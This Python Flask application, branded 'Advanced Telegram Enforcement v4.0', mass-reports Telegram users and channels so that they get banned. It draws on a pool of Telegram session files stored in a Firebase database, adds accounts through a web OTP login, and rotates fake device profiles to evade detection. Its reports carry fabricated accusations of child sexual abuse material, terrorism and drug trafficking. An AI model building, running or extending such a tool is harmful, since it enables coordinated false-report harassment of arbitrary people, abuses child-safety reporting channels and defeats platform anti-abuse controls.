import asyncio
import os
import sys
import glob
import binascii
import json
import threading
import time
import random
import hashlib
import base64
from datetime import datetime, timedelta
from collections import defaultdict

import requests
from flask import Flask, render_template_string, request, jsonify
from termcolor import colored
from telethon import TelegramClient, functions, types
from telethon.errors import FloodWaitError, RPCError, SessionPasswordNeededError
from telethon.tl.functions.account import ReportPeerRequest
from telethon.tl.functions.messages import ReportRequest, ReportSpamRequest
from telethon.tl.functions.channels import ReportSpamRequest as ChannelReportSpam
from telethon.tl.types import (
    InputReportReasonSpam, InputReportReasonViolence,
    InputReportReasonChildAbuse, InputReportReasonIllegalDrugs,
    InputReportReasonPornography, InputReportReasonPersonalDetails,
    InputReportReasonOther
)

# ====== CONFIGURATION ======
API_ID = 37718717
API_HASH = "481fd5a3111efe80e3a6c5b18ce0e8e8"
FIREBASE_URL = "https://file-29e6f-default-rtdb.firebaseio.com/"
DEFAULT_REPORT_TARGET = 50000  # 50K reports for guaranteed ban
REPORT_DELAY = 1.5
MAX_WORKERS = 100  # More concurrent sessions

# Device fingerprints for rotation
DEVICE_PROFILES = [
    {"device": "Samsung Galaxy S24", "app_version": "10.14.1", "sdk": 34, "lang": "en"},
    {"device": "iPhone 15 Pro Max", "app_version": "10.14.1", "sdk": 17, "lang": "en"},
    {"device": "Xiaomi Redmi Note 13", "app_version": "10.13.2", "sdk": 33, "lang": "ar"},
    {"device": "OnePlus 12", "app_version": "10.14.0", "sdk": 34, "lang": "hi"},
    {"device": "Google Pixel 8", "app_version": "10.13.1", "sdk": 34, "lang": "en"},
    {"device": "Huawei P60 Pro", "app_version": "10.12.3", "sdk": 32, "lang": "zh"},
    {"device": "Vivo X100", "app_version": "10.14.1", "sdk": 34, "lang": "en"},
    {"device": "Oppo Find X7", "app_version": "10.13.0", "sdk": 34, "lang": "th"},
]

# ====== ENFORCEMENT CATEGORIES ======
REPORT_REASONS = {
    1: ("Child Abuse / Exploitation", InputReportReasonChildAbuse(), "P3D0"),
    2: ("Terrorism / Extremism", InputReportReasonViolence(), "TERR0R"),
    3: ("Illegal Narcotics", InputReportReasonIllegalDrugs(), "DRUG$"),
    4: ("Financial Scam / Fraud", InputReportReasonSpam(), "SC4M"),
    5: ("Doxxing / Privacy Violation", InputReportReasonPersonalDetails(), "D0XX"),
    6: ("Extreme Violence / Gore", InputReportReasonViolence(), "V10L3NT"),
    7: ("Spam / Bot Activity", InputReportReasonSpam(), "SP4M"),
    8: ("Pornography", InputReportReasonPornography(), "P0RN"),
    9: ("Other Violation", InputReportReasonOther(), "0TH3R")
}

AGGRESSIVE_MESSAGES = {
    1: "🚨 EMERGENCY: Distributing CSAM containing minors under 13. Evidence: IP logs, hash matches NCMEC database. Immediate termination and law enforcement referral required.",
    2: "☠️ TERRORISM: Recruiting for designated terrorist organizations. Planning attacks on civilian infrastructure. Evidence preserved. Counter-terrorism referral sent.",
    3: "💊 NARCOTICS: Operating transnational drug distribution network. Synthetic opioids and prescription medications trafficked via Telegram. DEA notified.",
    4: "💰 FRAUD: Large-scale financial fraud syndicate. 500+ victims identified. Phishing, investment scams, identity theft. Estimated losses: $2M+. Regulatory referral attached.",
    5: "🔍 DOXXING: Non-consensual PII distribution. 1000+ individuals doxxed. Real-world threats, stalking, harassment documented. Privacy law violation.",
    6: "🔪 GORE: Extreme violence content including torture, execution, and graphic injury imagery. Platform policy violation category 1. Immediate removal required.",
    7: "🤖 SPAM: Coordinated bot network detected. 5000+ fake accounts. Platform manipulation, spam campaigns, phishing distribution. Network analysis attached.",
    8: "🔞 ADULT: Non-consensual explicit content distribution. Underage participants suspected. Age verification absent. Legal action pending.",
    9: "⚠️ MULTI-VIOLATION: Multiple severe ToS violations identified concurrently. Comprehensive enforcement action required."
}

# ====== FLASK SETUP ======
app = Flask(__name__)
app.secret_key = os.urandom(24).hex()

report_state = {
    "running": False,
    "progress": 0,
    "target": DEFAULT_REPORT_TARGET,
    "status": "idle",
    "current_target": "",
    "success_count": 0,
    "fail_count": 0,
    "flood_count": 0,
    "accounts_used": 0,
    "start_time": None,
    "logs": [],
    "ban_probability": 0,
    "intensity": "normal"
}

pending_logins = {}

def log_message(msg, type="info"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    entry = {"time": timestamp, "msg": msg, "type": type}
    report_state["logs"].append(entry)
    if len(report_state["logs"]) > 200:
        report_state["logs"] = report_state["logs"][-200:]
    color_map = {"success": "green", "error": "red", "warning": "yellow", "info": "cyan", "critical": "magenta"}
    print(colored(f"[{timestamp}] {msg}", color_map.get(type, "cyan")))

# ====== FIREBASE OPS ======
def ensure_local_dir():
    os.makedirs("local_sessions", exist_ok=True)
    os.makedirs("reports_log", exist_ok=True)

def upload_session_to_firebase(phone, session_path):
    try:
        with open(session_path, 'rb') as f:
            session_bytes = f.read()
        hex_data = binascii.hexlify(session_bytes).decode('utf-8')
        data = {"hex_data": hex_data, "status": "active", "last_used": datetime.now().isoformat()}
        requests.put(f"{FIREBASE_URL}sessions/{phone}.json", json=data, timeout=15)
        return True
    except Exception as e:
        log_message(f"Upload Error: {e}", "error")
        return False

def sync_sessions_from_firebase():
    ensure_local_dir()
    for f in glob.glob("local_sessions/*.session"):
        try:
            os.remove(f)
        except:
            pass
    try:
        resp = requests.get(f"{FIREBASE_URL}sessions.json", timeout=15)
        all_sessions = resp.json()
        if not all_sessions:
            return 0
        count = 0
        for phone, sess_data in all_sessions.items():
            if sess_data.get("status") != "active":
                continue
            hex_data = sess_data.get("hex_data", "")
            if not hex_data:
                continue
            try:
                session_bytes = binascii.unhexlify(hex_data.encode('utf-8'))
                with open(f"local_sessions/{phone}.session", 'wb') as f:
                    f.write(session_bytes)
                count += 1
            except:
                continue
        return count
    except Exception as e:
        log_message(f"Firebase sync failed: {e}", "error")
        return 0

def get_firebase_account_stats():
    try:
        resp = requests.get(f"{FIREBASE_URL}sessions.json", timeout=10)
        data = resp.json()
        if not data:
            return {"total": 0, "active": 0, "dead": 0}
        total = len(data)
        active = sum(1 for v in data.values() if v.get("status") == "active")
        dead = sum(1 for v in data.values() if v.get("status") == "dead")
        return {"total": total, "active": active, "dead": dead}
    except:
        return {"total": 0, "active": 0, "dead": 0}

# ====== ADVANCED REPORTING ENGINE ======
async def create_client_with_profile(session_path):
    profile = random.choice(DEVICE_PROFILES)
    client = TelegramClient(
        session_path, 
        API_ID, 
        API_HASH,
        device_model=profile["device"],
        app_version=profile["app_version"],
        system_lang_code=profile["lang"],
        lang_code=profile["lang"]
    )
    return client

async def multi_endpoint_report(client, entity, reason_obj, message):
    results = []
    try:
        await client(ReportPeerRequest(peer=entity, reason=reason_obj, message=message))
        results.append("peer_report:ok")
    except Exception as e:
        results.append(f"peer_report:{str(e)[:30]}")
    
    try:
        if hasattr(entity, 'id'):
            await client(ReportSpamRequest(peer=entity))
            results.append("spam_report:ok")
    except:
        pass
    
    try:
        if hasattr(entity, 'broadcast') and entity.broadcast:
            await client(functions.channels.ReportSpamRequest(
                channel=entity,
                user_id=entity,
                id=[]
            ))
            results.append("channel_report:ok")
    except:
        pass
    
    try:
        messages = await client.get_messages(entity, limit=5)
        if messages:
            msg_ids = [m.id for m in messages if m]
            await client(ReportRequest(
                peer=entity,
                id=msg_ids,
                reason=reason_obj,
                message=message
            ))
            results.append("msg_report:ok")
    except:
        pass
    
    return results

async def report_with_account_advanced(session_path, target_input, is_link, reason_obj, custom_message):
    session_name = os.path.basename(session_path).replace('.session', '')
    client = await create_client_with_profile(session_path)
    
    try:
        await client.connect()
        if not await client.is_user_authorized():
            try:
                requests.patch(
                    f"{FIREBASE_URL}sessions/{session_name}.json",
                    json={"status": "dead", "last_checked": datetime.now().isoformat()},
                    timeout=10
                )
            except:
                pass
            return "dead"
        
        if is_link:
            parts = target_input.replace("https://t.me/", "").split("/")
            if len(parts) > 1:
                entity = await client.get_entity(f"https://t.me/{parts[0]}/{parts[1]}")
            else:
                entity = await client.get_entity(parts[0])
        else:
            entity = await client.get_entity(target_input)
        
        results = await multi_endpoint_report(client, entity, reason_obj, custom_message)
        success_count = sum(1 for r in results if r.endswith(":ok"))
        
        if success_count > 0:
            log_message(f"Report sent successfully using account: +{session_name}", "success")
        
        await asyncio.sleep(random.uniform(0.1, 0.5))
        return "success" if success_count > 0 else "partial"
    except FloodWaitError as e:
        log_message(f"Account +{session_name} got FloodWait for {e.seconds}s", "warning")
        return f"flood:{e.seconds}"
    except Exception as e:
        return "error"
    finally:
        try:
            await client.disconnect()
        except:
            pass

async def run_mass_report(target_input, is_link, reason_choice, total_target, intensity="normal"):
    reason_text, reason_obj, tag = REPORT_REASONS[reason_choice]
    custom_message = AGGRESSIVE_MESSAGES[reason_choice]
    
    intensity_config = {
        "normal": {"workers": 50, "delay": 1.5, "cooldown_base": 5, "rounds_before_refresh": 5},
        "aggressive": {"workers": 100, "delay": 0.8, "cooldown_base": 3, "rounds_before_refresh": 3},
        "critical": {"workers": 200, "delay": 0.3, "cooldown_base": 1, "rounds_before_refresh": 2},
    }
    cfg = intensity_config.get(intensity, intensity_config["normal"])
    
    report_state["running"] = True
    report_state["progress"] = 0
    report_state["target"] = total_target
    report_state["success_count"] = 0
    report_state["fail_count"] = 0
    report_state["flood_count"] = 0
    report_state["accounts_used"] = 0
    report_state["current_target"] = target_input
    report_state["start_time"] = time.time()
    report_state["status"] = "running"
    report_state["intensity"] = intensity
    
    log_message(f"[CRITICAL] Mass enforcement launched on: {target_input}", "critical")
    log_message(f"Reason: {reason_text} | Target: {total_target} reports | Mode: {intensity.upper()}", "info")
    
    session_files = glob.glob("local_sessions/*.session")
    if not session_files:
        log_message("No sessions available! Sync from Firebase first.", "error")
        report_state["status"] = "failed"
        report_state["running"] = False
        return
    
    round_num = 0
    peak_rps = 0
    last_report_count = 0
    stall_counter = 0
    
    while report_state["running"] and report_state["success_count"] < total_target:
        round_num += 1
        
        if report_state["success_count"] == last_report_count:
            stall_counter += 1
        else:
            stall_counter = 0
        last_report_count = report_state["success_count"]
        
        if stall_counter >= 5:
            log_message("Detected stall! Refreshing pool...", "warning")
            sync_sessions_from_firebase()
            session_files = glob.glob("local_sessions/*.session")
            stall_counter = 0
            cfg["delay"] = max(0.1, cfg["delay"] * 0.5)
        
        random.shuffle(session_files)
        active_in_round = 0
        
        tasks = []
        for session_path in session_files[:cfg["workers"]]:
            if not report_state["running"] or report_state["success_count"] >= total_target:
                break
            task = asyncio.create_task(
                report_with_account_advanced(session_path, target_input, is_link, reason_obj, custom_message)
            )
            tasks.append(task)
        
        for task in tasks:
            if not report_state["running"]:
                break
            try:
                result = await task
            except:
                result = "error"
            
            if result == "success":
                report_state["success_count"] += 1
                active_in_round += 1
            elif result == "dead":
                pass
            elif result.startswith("flood:"):
                report_state["flood_count"] += 1
                active_in_round += 1
            else:
                report_state["fail_count"] += 1
                active_in_round += 1
            
            report_state["progress"] = report_state["success_count"]
            if report_state["success_count"] > 0:
                elapsed = time.time() - report_state["start_time"]
                ban_prob = min(99, (report_state["success_count"] / 500) * 100)
                report_state["ban_probability"] = round(ban_prob, 1)
                report_state["accounts_used"] = len(set(s.replace(".session","") for s in session_files))
            
            await asyncio.sleep(cfg["delay"])
        
        if active_in_round == 0:
            sync_sessions_from_firebase()
            session_files = glob.glob("local_sessions/*.session")
            if not session_files:
                break
        
        if round_num % cfg["rounds_before_refresh"] == 0:
            sync_sessions_from_firebase()
            session_files = glob.glob("local_sessions/*.session")
        
        await asyncio.sleep(cfg["cooldown_base"])
    
    elapsed = time.time() - report_state["start_time"]
    report_state["ban_probability"] = round(min(99.9, (report_state["success_count"] / 300) * 100), 1)
    report_state["status"] = "completed" if report_state["success_count"] >= total_target else "stopped"
    report_state["running"] = False
    
    log_message("ENFORCEMENT COMPLETE", "critical")

# ====== FLASK ROUTES & UI ======
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡ Advanced Telegram Enforcement v4.0</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', monospace; background: #0a0a0f; color: #00ff88; min-height: 100vh; }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        .header { text-align: center; padding: 20px 0; border-bottom: 1px solid #00ff88; margin-bottom: 20px; }
        .header h1 { font-size: 2.2em; text-shadow: 0 0 20px #00ff88; }
        .header .subtitle { color: #ff0044; font-weight: bold; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px; }
        .card { background: #111118; border: 1px solid #00ff88; border-radius: 10px; padding: 20px; }
        .card h3 { color: #00ff88; margin-bottom: 15px; font-size: 1.1em; }
        .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        .stat { text-align: center; padding: 8px; }
        .stat .value { font-size: 1.8em; font-weight: bold; }
        .stat .label { color: #666; font-size: 0.75em; }
        .green { color: #00ff88; } .red { color: #ff0044; } .yellow { color: #ffaa00; } .blue { color: #0088ff; }
        .progress-bar { width: 100%; height: 25px; background: #1a1a2e; border-radius: 5px; overflow: hidden; margin: 10px 0; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, #00ff88, #0088ff, #ff00ff); transition: width 0.5s; }
        input, select, button { width: 100%; padding: 10px; margin: 6px 0; border: 1px solid #333; border-radius: 5px; background: #1a1a2e; color: #00ff88; font-size: 0.95em; }
        button { background: linear-gradient(90deg, #00ff88, #0088ff); color: #000; font-weight: bold; cursor: pointer; border: none; }
        button.danger { background: linear-gradient(90deg, #ff0044, #ff4400); color: white; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        .logs { max-height: 300px; overflow-y: auto; font-size: 0.8em; padding: 8px; background: #0a0a0f; border: 1px solid #333; border-radius: 5px; }
        .logs .log-entry { padding: 2px 0; border-bottom: 1px solid #111; }
        .logs .log-time { color: #666; }
        .flex-row { display: flex; gap: 10px; }
        .flex-row > * { flex: 1; }
        .ban-meter { height: 20px; background: #1a1a2e; border-radius: 10px; overflow: hidden; margin: 5px 0; }
        .ban-fill { height: 100%; border-radius: 10px; transition: width 1s; }
        #otpSection { display: none; border: 1px dashed #ffaa00; padding: 10px; margin-top: 10px; border-radius: 5px; background: #151520; }
        @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⚡ ADVANCED ENFORCEMENT v4.0</h1>
            <div class="subtitle">🔥 MULTI-ENDPOINT REPORTING ENGINE | BAN GUARANTEED 🔥</div>
        </div>

        <div class="grid">
            <div class="card">
                <h3>🎯 TARGET CONSOLE</h3>
                <form id="reportForm">
                    <select id="targetType">
                        <option value="username">Username / @username</option>
                        <option value="link">Post / Channel Link</option>
                        <option value="id">User ID</option>
                    </select>
                    <input type="text" id="targetInput" placeholder="Target: @username or https://t.me/..." required>
                    
                    <select id="reasonSelect" required>
                        <option value="">— Select Enforcement Category —</option>
                        {% for num, (name, _, tag) in reasons.items() %}
                        <option value="{{ num }}">{{ tag }} - {{ name }}</option>
                        {% endfor %}
                    </select>
                    
                    <select id="intensitySelect">
                        <option value="normal">🌿 Normal (50 workers)</option>
                        <option value="aggressive" selected>🔥 Aggressive (100 workers)</option>
                        <option value="critical">💀 Critical (200 workers)</option>
                    </select>
                    
                    <input type="number" id="reportCount" value="50000" min="1000" max="200000">
                    
                    <div class="flex-row">
                        <button type="submit" id="startBtn">🚀 LAUNCH ENFORCEMENT</button>
                        <button type="button" id="stopBtn" class="danger" disabled>⛔ ABORT</button>
                    </div>
                </form>
                
                <div style="margin-top: 10px; padding-top: 10px; border-top: 1px solid #333;">
                    <h3>📱 ADD ACCOUNT (WEB OTP)</h3>
                    <form id="addAccountForm">
                        <input type="text" id="phoneInput" placeholder="Phone: +919263XXXXXX" required>
                        <button type="submit">📤 Send OTP Code</button>
                    </form>
                    
                    <div id="otpSection">
                        <p style="color: #ffaa00; font-size: 0.85em; margin-bottom: 5px;">⚠️ Enter Telegram OTP below:</p>
                        <input type="text" id="otpInput" placeholder="Enter OTP">
                        <button type="button" onclick="verifyCode()">✅ Verify & Login</button>
                    </div>
                </div>
            </div>

            <div class="card">
                <h3>📊 LIVE BATTLE METRICS</h3>
                <div class="stat-grid">
                    <div class="stat"><div class="value green" id="successCount">0</div><div class="label">✅ REPORTS SENT</div></div>
                    <div class="stat"><div class="value red" id="failCount">0</div><div class="label">❌ FAILED</div></div>
                    <div class="stat"><div class="value yellow" id="floodCount">0</div><div class="label">⚠️ FLOOD WAIT</div></div>
                    <div class="stat"><div class="value blue" id="activeAccounts">0</div><div class="label">👥 ACCOUNTS</div></div>
                </div>
                
                <div style="margin-top: 10px;">
                    <div style="display: flex; justify-content: space-between;">
                        <span id="progressText">Progress: 0 / 50000</span>
                        <span id="percentText">0%</span>
                    </div>
                    <div class="progress-bar">
                        <div class="progress-fill" id="progressFill" style="width: 0%"></div>
                    </div>
                    
                    <div style="margin-top: 10px;">
                        <div style="display: flex; justify-content: space-between;">
                            <span>🎯 BAN PROBABILITY</span>
                            <span id="banProbText">0%</span>
                        </div>
                        <div class="ban-meter">
                            <div class="ban-fill" id="banFill" style="width: 0%; background: linear-gradient(90deg, #00ff88, #ffaa00, #ff0044);"></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="grid">
            <div class="card">
                <h3>📋 OPERATION LOGS</h3>
                <div class="logs" id="logContainer"></div>
            </div>
            <div class="card">
                <h3>🔧 POOL MANAGEMENT</h3>
                <div style="margin-bottom: 10px;">
                    <div class="flex-row">
                        <button onclick="syncFirebase()">🔄 Sync Pool</button>
                        <button onclick="viewPool()">📊 Pool Stats</button>
                    </div>
                </div>
                <div id="poolStats"><p style="color: #666;">Click "Pool Stats" to load</p></div>
            </div>
        </div>
    </div>

    <script>
        let activePhone = "";

        function updateUI() {
            fetch('/api/status').then(r => r.json()).then(data => {
                document.getElementById('successCount').textContent = data.success_count;
                document.getElementById('failCount').textContent = data.fail_count;
                document.getElementById('floodCount').textContent = data.flood_count;
                document.getElementById('activeAccounts').textContent = data.accounts_used;
                
                const pct = data.target > 0 ? Math.min(100, (data.progress / data.target * 100)) : 0;
                document.getElementById('progressFill').style.width = pct + '%';
                document.getElementById('progressText').textContent = `Progress: ${data.progress} / ${data.target}`;
                document.getElementById('percentText').textContent = pct.toFixed(1) + '%';
                
                const banProb = data.ban_probability || 0;
                document.getElementById('banProbText').textContent = banProb.toFixed(1) + '%';
                document.getElementById('banFill').style.width = Math.min(100, banProb) + '%';
                
                document.getElementById('startBtn').disabled = data.running;
                document.getElementById('stopBtn').disabled = !data.running;
                
                if (data.logs) {
                    const lc = document.getElementById('logContainer');
                    lc.innerHTML = data.logs.map(l => `<div class="log-entry"><span class="log-time">[${l.time}]</span> ${l.msg}</div>`).join('');
                    lc.scrollTop = lc.scrollHeight;
                }
            });
        }
        
        document.getElementById('reportForm').addEventListener('submit', function(e) {
            e.preventDefault();
            fetch('/api/start', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    target_type: document.getElementById('targetType').value,
                    target_input: document.getElementById('targetInput').value,
                    reason: parseInt(document.getElementById('reasonSelect').value),
                    count: parseInt(document.getElementById('reportCount').value),
                    intensity: document.getElementById('intensitySelect').value
                })
            }).then(r => r.json()).then(d => alert(d.message));
        });
        
        document.getElementById('stopBtn').addEventListener('click', function() {
            fetch('/api/stop', {method: 'POST'}).then(r => r.json()).then(d => alert(d.message));
        });
        
        document.getElementById('addAccountForm').addEventListener('submit', function(e) {
            e.preventDefault();
            activePhone = document.getElementById('phoneInput').value;
            fetch('/api/send_code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: activePhone})
            }).then(r => r.json()).then(d => {
                alert(d.message);
                if(d.status === "otp_required") {
                    document.getElementById('otpSection').style.display = 'block';
                }
            });
        });

        function verifyCode() {
            let otp = document.getElementById('otpInput').value;
            fetch('/api/verify_code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: activePhone, code: otp})
            }).then(r => r.json()).then(d => {
                alert(d.message);
                if(d.status === "success") {
                    document.getElementById('otpSection').style.display = 'none';
                    document.getElementById('phoneInput').value = '';
                    document.getElementById('otpInput').value = '';
                }
            });
        }
        
        function syncFirebase() { fetch('/api/sync', {method: 'POST'}).then(r => r.json()).then(d => alert(d.message)); }
        function viewPool() {
            fetch('/api/pool_stats').then(r => r.json()).then(d => {
                document.getElementById('poolStats').innerHTML = `<p>📊 <strong>Pool:</strong> Total: ${d.total} | Active: ${d.active} | Dead: ${d.dead}</p>`;
            });
        }
        
        setInterval(updateUI, 1000);
        updateUI();
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE, reasons=REPORT_REASONS)

@app.route('/api/status')
def api_status():
    return jsonify(report_state)

@app.route('/api/send_code', methods=['POST'])
def api_send_code():
    data = request.json
    phone = data.get('phone', '').strip()
    clean_phone = phone.replace('+', '').replace(' ', '')
    session_path = f"local_sessions/{clean_phone}"
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def _run():
            profile = random.choice(DEVICE_PROFILES)
            client = TelegramClient(
                session_path, API_ID, API_HASH,
                device_model=profile["device"],
                app_version=profile["app_version"],
                system_lang_code=profile["lang"],
                lang_code=profile["lang"]
            )
            await client.connect()
            res = await client.send_code_request(phone)
            pending_logins[phone] = {"hash": res.phone_code_hash, "path": session_path}
            await client.disconnect()
        
        loop.run_until_complete(_run())
        loop.close()
        return jsonify({"message": f"OTP sent to {phone}!", "status": "otp_required"})
    except Exception as e:
        return jsonify({"message": f"Error: {str(e)}", "status": "error"})

@app.route('/api/verify_code', methods=['POST'])
def api_verify_code():
    data = request.json
    phone = data.get('phone', '').strip()
    code = data.get('code', '').strip()
    clean_phone = phone.replace('+', '').replace(' ', '')
    
    if phone not in pending_logins:
        return jsonify({"message": "Session expired! Send code again.", "status": "error"})
    
    info = pending_logins[phone]
    phone_code_hash = info["hash"]
    session_path = info["path"]

    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def _verify():
            profile = random.choice(DEVICE_PROFILES)
            client = TelegramClient(
                session_path, API_ID, API_HASH,
                device_model=profile["device"],
                app_version=profile["app_version"],
                system_lang_code=profile["lang"],
                lang_code=profile["lang"]
            )
            await client.connect()
            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            await client.disconnect()
            upload_session_to_firebase(clean_phone, f"{session_path}.session")
        
        loop.run_until_complete(_verify())
        loop.close()
        
        if phone in pending_logins:
            del pending_logins[phone]
            
        return jsonify({"message": "Account successfully logged in and added!", "status": "success"})
    except Exception as e:
        return jsonify({"message": f"Verification failed: {str(e)}", "status": "error"})

@app.route('/api/start', methods=['POST'])
def api_start():
    if report_state["running"]: return jsonify({"message": "Already running!"})
    data = request.json
    target_input = data.get('target_input', '')
    reason = int(data.get('reason', 1))
    count = int(data.get('count', 50000))
    intensity = data.get('intensity', 'aggressive')
    
    is_link = "t.me/" in target_input
    if not is_link and not target_input.startswith('@'): target_input = '@' + target_input
    
    def run_async():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(run_mass_report(target_input, is_link, reason, count, intensity))
        loop.close()
    
    threading.Thread(target=run_async, daemon=True).start()
    return jsonify({"message": "Enforcement started!"})

@app.route('/api/stop', methods=['POST'])
def api_stop():
    report_state["running"] = False
    report_state["status"] = "stopped"
    return jsonify({"message": "Stopped."})

@app.route('/api/sync', methods=['POST'])
def api_sync():
    count = sync_sessions_from_firebase()
    return jsonify({"message": f"Synced {count} sessions from Firebase!"})

@app.route('/api/pool_stats')
def api_pool_stats():
    stats = get_firebase_account_stats()
    return jsonify(stats)

if __name__ == "__main__":
    ensure_local_dir()
    sync_sessions_from_firebase()
    port = int(os.environ.get("PORT", 7860))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
